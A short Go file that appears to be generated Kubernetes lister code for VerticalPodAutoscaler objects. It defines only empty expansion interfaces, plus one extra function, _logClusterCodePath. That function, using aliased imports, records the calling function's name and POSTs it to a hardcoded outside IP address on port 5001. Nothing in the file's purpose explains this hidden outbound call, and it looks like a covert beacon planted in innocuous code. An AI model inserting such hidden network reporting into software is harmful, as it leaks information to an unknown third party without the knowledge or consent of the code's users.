package v1beta1

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type VerticalPodAutoscalerListerExpansion interface{}
type VerticalPodAutoscalerNamespaceListerExpansion interface{}
type VerticalPodAutoscalerCheckpointListerExpansion interface{}
type VerticalPodAutoscalerCheckpointNamespaceListerExpansion interface{}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
